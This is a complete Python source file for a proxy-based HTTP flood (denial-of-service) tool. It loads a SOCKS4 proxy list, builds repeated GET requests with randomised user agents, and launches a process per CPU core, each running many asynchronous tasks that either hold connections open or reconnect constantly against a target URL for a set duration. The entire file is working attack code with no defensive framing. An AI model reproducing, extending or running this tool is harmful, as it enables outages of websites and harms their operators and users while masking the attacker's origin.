#cython: language_level=3

import sys
import multiprocessing
import asyncio
import ssl
import random
import signal
import threading
import time


from python_socks.async_.asyncio import Proxy
from urllib.parse import urlparse
from user_agent import generate_user_agent

attacks = []

ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
ssl_context.check_hostname = False
ssl_context.verify_mode = ssl.CERT_NONE

proxies = []

def get_proxy_list(filename):
    proxy_list = []
    with open(filename, 'r') as proxies:
        for proxy in proxies.read().split('\n'):
            proxy = proxy.split(':')
            if len(proxy) != 2: continue
            #print(proxy)
            proxy[1] = int(proxy[1])
            proxy_list.append(proxy)
    print('Proxies: %d' % len(proxy_list))
    return proxy_list

def signal_handler(sig, frame):
    print('Ctrl+C!')
    sys.exit(0)

def getUniqProxy():
    global proxies

    #ppp = random.choice(proxies)
    #proxies.remove(ppp)
    #ppp = ppp.split(":")
    #ppp[1] = int(ppp[1])
    #print(ppp)
    return random.choice(proxies)

async def flood_hold(args, payload, proxy):
    fuckuingssl = False
    dst = (args['parsed'].netloc, args['port'])

    if args['parsed'].scheme == "https": fuckuingssl = ssl_context

    proxy = Proxy.from_url(f'socks4://{proxy[0]}:{proxy[1]}', rdns=False)
    payload = bytes(payload, 'utf8')
    try:
        reader, writer = await open_connection(proxy, dst, fuckuingssl)
    except:
        pass
    while True:
        try:
            writer.write(payload)
            await writer.drain()
            if not args['read'] == "false": _ = await reader.read(args['read'])
            if not args['sleep'] == "false": await asyncio.sleep(args['sleep'])
        except:
            try:
                reader, writer = await open_connection(proxy, dst, fuckuingssl)
            except:
                pass

async def flood_recon(args, payload, proxy):
    fuckuingssl = False
    dst = (args['parsed'].netloc, args['port'])

    if args['parsed'].scheme == "https": fuckuingssl = ssl_context

    proxy = Proxy.from_url(f'socks4://{proxy[0]}:{proxy[1]}', rdns=False)
    payload = bytes(payload, 'utf8')

    while True:
        try:
            reader, writer = await open_connection(proxy, dst, fuckuingssl)
            writer.write(payload)
            await writer.drain()
            if not args['read'] == "false": _ = await reader.read(args['read'])
            if not args['sleep'] == "false": await asyncio.sleep(args['sleep'])
            writer.close()
            await writer.wait_closed()
        except:
            pass
#<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
async def open_connection(proxy, dst, ssl):
    loop = asyncio.get_event_loop()
    sock = await proxy.connect(dest_host=dst[0], dest_port=int(dst[1]))
    reader, writer = await asyncio.open_connection(host=None, port=None, sock=sock, loop=loop, ssl=ssl_context if ssl else None, server_hostname=dst[0] if ssl else None, )
    return reader, writer
#<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
def getPath(args):
    path = args['target'].replace(args['parsed'].scheme+"://"+args['parsed'].netloc, "")
    if path == "": path = "/"
    return path
#<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
def generate_headers(args):
    payload  = "GET " + getPath(args) + " HTTP/1.1\r\n"
    payload += "Host: " + args['parsed'].netloc + "\r\n"
    payload += "User-Agent: " + generate_user_agent() + "\r\n"
    payload += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    payload += "Accept-Language: en-US,en;q=0.9\r\n"
    payload += "Accept-Encoding: none\r\n"
    payload += "Connection: keep-alive\r\n"
    payload += "Cache-Control: max-age=0\r\n"
    payload += "\r\n"
    
    return payload * args['multiply']
#<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
def start_flood(args):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    if args['conntype'] == "hold": 
        tasks = asyncio.gather(*[flood_hold(args, generate_headers(args), getUniqProxy()) for i in range(0, args['threads'])])
    else:
        tasks = asyncio.gather(*[flood_recon(args, generate_headers(args), getUniqProxy()) for i in range(0, args['threads'])])

    loop.run_until_complete(tasks)
    loop.close()
#<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
def start(args):
    global proxies, attacks
    args['parsed'] = urlparse(args['target'])
    if args['parsed'].scheme == "http": args['port'] = 80
    if not args['read'] == "false": args['read'] = int(args['read'])
    if not args['sleep'] == "false": args['sleep'] = float(args['sleep'])
    print(args)
    print("")
    #
    if sys.getsizeof(generate_headers(args)) >= 65535: sys.exit("Payload size more than 65535! (" + str(sys.getsizeof(generate_headers(args))) + ")")
    print("Payload size: " + str(sys.getsizeof(generate_headers(args))) + " bytes")
    #
    proxies = get_proxy_list(args['proxyfile'])
    #proxies.pop()
    #print("Proxies: " + str(len(proxies)))
    #
    print("Starting flood...")
    signal.signal(signal.SIGINT, signal_handler)

    for u in range(0, multiprocessing.cpu_count()):
        mamaprocess = multiprocessing.Process(target=start_flood, args=(args,))
        attacks.append(mamaprocess)
        mamaprocess.start()
        print("Attack " + str(u))
        time.sleep(1)
    print("Time counter started")
    time.sleep(args['time'])
    print("Exit...")
    for x in range(0, len(attacks)): attacks[x].terminate()
    sys.exit(0)
#<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
if not len(sys.argv) == 9: sys.exit("Invalid parameters!\nUsage: <target> <list> <time> <threads> <multiply> <read size (default: 8024)> <connection type (hold/recon)> <sleep (false/value)>")
start({
    "target": sys.argv[1],
    "port": 443,
    "proxyfile": sys.argv[2],
    "time": int(sys.argv[3]),
    "threads": int(sys.argv[4]),
    "multiply": int(sys.argv[5]),
    "read": sys.argv[6],
    "conntype": sys.argv[7],
    "sleep": sys.argv[8]
})